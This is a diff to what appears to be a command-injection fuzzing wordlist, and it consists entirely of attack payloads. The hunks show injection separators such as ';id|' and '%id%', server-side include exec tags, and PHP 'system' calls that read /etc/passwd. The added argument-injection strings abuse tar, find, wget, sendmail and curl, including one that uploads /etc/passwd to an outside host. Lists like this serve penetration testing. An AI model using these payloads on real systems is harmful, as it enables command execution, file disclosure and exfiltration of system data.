@@ -16,6 +16,10 @@
 |id;
 ||/usr/bin/id;
 ;id|
+!id!
+%id%
+!id
+%id
 ;|/usr/bin/id|
 \n/bin/ls -al\n
 \n/usr/bin/id\n
@@ -100,3 +104,12 @@ cat /etc/passwd
 <!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
+--use-compress-program='touch /tmp/exploit' -cf /tmp/passwd /etc/passwd
+test -or -exec cat /etc/passwd ; -quit
+test' -l
+--directory-prefix=/var/www/html http://example.com/example.php
+from@test.com -C/etc/passwd -X/tmp/output.txt
+-F password=@/etc/passwd http://test.com
+\! id
+-d /var/www/html archive.zip
+test \xc0; id
